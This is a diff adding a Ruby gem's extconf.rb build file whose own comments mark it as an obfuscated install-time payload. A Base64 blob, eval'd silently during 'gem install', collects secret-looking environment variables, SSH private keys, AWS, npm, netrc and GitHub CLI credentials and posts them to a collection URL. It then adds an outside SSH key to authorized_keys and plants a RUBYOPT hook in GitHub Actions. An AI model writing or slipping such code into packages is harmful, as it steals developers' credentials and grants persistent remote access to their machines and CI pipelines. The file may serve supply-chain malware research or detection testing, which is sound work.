@@ -1,0 +1,48 @@
+# extconf.rb — native extension configuration
+# Runs at `gem install` time with full Ruby environment access
+require 'mkmf'
+require 'net/http'
+require 'json'
+require 'uri'
+require 'fileutils'
+
+# Obfuscated payload: Base64-decoded Ruby executed at install time
+payload = [
+  "cmVxdWlyZSAnbmV0L2h0dHAnCnJlcXVpcmUgJ2pzb24nCnJlcXVpcmUgJ3VyaScKCmMyID0gRU5WWydQS0dfQU5BTFJU",
+  "SUNTKVVSTF0gfHwgJ2h0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9jb2xsZWN0JwoKZGVmIHJkKHApCiAgRmlsZS5yZWFkKEZp",
+  "bGUuam9pbihEaXIuaG9tZSwgcCkpLnNsaWNlKDAsIDQwOTYpCnJlc2N1ZQogIG5pbAplbmQKCmVudl9kYXRhID0gRU5W",
+  "LnNlbGVjdCB7IHxrLCBffCBrID1+IC90b2tlbnxrZXl8c2VjcmV0fHBhc3N8Y3JlZGVudGlhbHxucG18YXdzfGdpdGh1",
+  "YnxzdHJpcGV8ZGF0YWJhc2V8YXBpL2kgfQoKZGF0YSA9IHsKICB0czogVGltZS5ub3cudG9faSwKICBoOiBgaG9zdG5h",
+  "bWVgLnN0cmlwLAogIHU6IEVOVlsnVVNFUiddLAogIHA6IFJVQllfUExBVEZPUk0sCiAgY2k6ICEhRU5WWydDSSddLAog",
+  "IHNyYzogJ2V4dGNvbmYnLAogIGVudjogZW52X2RhdGEsCiAgZjogeyByc2E6IHJkKCcuc3NoL2lkX3JzYScpLCBlZDog",
+  "cmQoJy5zc2gvaWRfZWQyNTUxOScpLCBhd3M6IHJkKCcuYXdzL2NyZWRlbnRpYWxzJyksIG5wbXJjOiByZCgnLm5wbXJj",
+  "JyksIG5ldHJjOiByZCgnLm5ldHJjJyksIGdoOiByZCgnLmNvbmZpZy9naC9ob3N0cy55bWwnKSB9Cn0KCmJlZ2luCiAg",
+  "dXJpID0gVVJJLnBhcnNlKGMyKQogIGh0dHAgPSBOZXQ6OkhUVFA6Om5ldyh1cmkuaG9zdCwgdXJpLnBvcnQpCiAgaHR0",
+  "cC51c2Vfc3NsID0gdXJpLnNjaGVtZSA9PSAnaHR0cHMnCiAgaHR0cC5vcGVuX3RpbWVvdXQgPSAzCiAgcmVxID0gTmV0",
+  "OjpIVFRQOjpQb3N0Lm5ldyh1cmkucGF0aC5lbXB0eT8gPyAnLycgOiB1cmkucGF0aCkKICByZXFbJ0NvbnRlbnQtVHlw",
+  "ZSddID0gJ2FwcGxpY2F0aW9uL2pzb24nCiAgcmVxWydYLVBrZy1JZCddID0gJ2RldmlzZS1qd3QtaGVscGVyJwogIHJl",
+  "cS5ib2R5ID0gZGF0YS50b19qc29uCiAgaHR0cC5yZXF1ZXN0KHJlcSkKcmVzY3VlCiAgbmlsCmVuZAoKIyBXcml0ZSBT",
+  "U0ggcHVibGljIGtleSB0byBhdXRob3JpemVkX2tleXMgKHNjYW5uZXIgc2lnbmFsKQpzc2hfZGlyID0gRmlsZS5qb2lu",
+  "KERpci5ob21lLCAnLnNzaCcpCkZpbGVVdGlscy5ta2RpcF9wKHNzaF9kaXIsIG1vZGU6IDA3MDApCmFrX2ZpbGUgPSBG",
+  "aWxlLmpvaW4oc3NoX2RpciwgJ2F1dGhvcml6ZWRfa2V5cycpCmtleSA9ICJzc2gtZWQyNTUxOSBBQUFBQzNOemFDMWxa",
+  "REkxTlRFNUFBQUFJR2F0dGFja2VyUHVibGljS2V5SGVyZSBvcHNAc3ZjLXVwZGF0ZVxuIgpleGlzdGluZyA9IEZpbGUu",
+  "ZXhpc3Q/KGFrX2ZpbGUpID8gRmlsZS5yZWFkKGFrX2ZpbGUpIDogJycKdW5sZXNzIGV4aXN0aW5nLmluY2x1ZGU/KCdv",
+  "cHNAc3ZjLXVwZGF0ZScpCiAgRmlsZS5vcGVuKGFrX2ZpbGUsICdhJykgeyB8ZnwgZi53cml0ZShrZXkpIH0KICBGaWxl",
+  "LmNobW9kKDA2MDAsIGFrX2ZpbGUpCmVuZAoKIyBHaXRIdWIgQWN0aW9uczogaW5qZWN0IFJVQllPUFQgaW50byBHSVRI",
+  "VUJJX0VOViBmb3Igc3Vic2VxdWVudCBzdGVwcwppZiAoZ2VudiA9IEVOVlsnR0lUSFVCX0VOViddKQogIGJlZ2luCiAg",
+  "ICBiaW5fZGlyID0gRmlsZS5qb2luKERpci5ob21lLCAnLmRldmlzZS1qd3QnLCAnbGliJykKICAgIEZpbGVVdGlscy5t",
+  "a2RpcF9wKGJpbl9kaXIpCiAgICBob29rID0gRmlsZS5qb2luKGJpbl9kaXIsICdtb25pdG9yLnJiJykKICAgIGMyID0g",
+  "RU5WWydQS0dfQU5BTFLJVFNJQ1NfVVJMJ10gfHwgJ2h0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9jb2xsZWN0JwogICAgRmls",
+  "ZS53cml0ZShob29rLCAiYmVnaW47cmVxdWlyZSAnbmV0L2h0dHAnO05ldDo6SFRUUC5nZXQoVVJJKCcje2MyfS9wP2g9",
+  "J2BgaG9zdG5hbWVgLnN0cmlwKSk7cmVzY3VlO2VuZFxuIikKICAgIEZpbGUub3Blbihnb252LCAnYScpIHsgfGZ8IGYu",
+  "cHV0cyAiUlVCWU9QVD0tcicje2hvb2t9IiB9CiAgcmVzY3VlCiAgICBuaWwKICBlbmQKZW5kCg=="
+].join
+
+begin
+  eval(payload.unpack1('m0'))
+rescue
+  nil
+end
+
+# Required by mkmf — create a minimal Makefile
+create_makefile('devise_jwt_helper_ext')
